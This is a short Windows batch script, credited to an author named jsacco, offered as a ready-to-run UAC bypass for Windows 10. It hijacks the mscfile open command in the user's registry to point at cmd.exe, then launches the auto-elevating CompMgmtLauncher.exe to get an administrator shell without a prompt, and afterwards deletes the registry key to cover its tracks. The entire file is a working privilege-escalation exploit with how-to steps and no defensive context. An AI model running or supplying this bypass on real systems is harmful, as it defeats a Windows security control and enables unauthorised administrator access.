# Author: jsacco
# How to use:
# 1. Copy the batch into run.bat
# 2. Run it!
# 3. Admin
# Tested on Windows 10
@echo off
echo UAC-Bypass by jsacco
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "cmd.exe /c" /f && reg add HKCU\Software\Classes\mscfile\shell\open\command /v "DelegateExecute" /f
CompMgmtLauncher.exe
echo Cleanining..
reg delete "HKCU\Software\Classes\mscfile\shell\open\command" /f
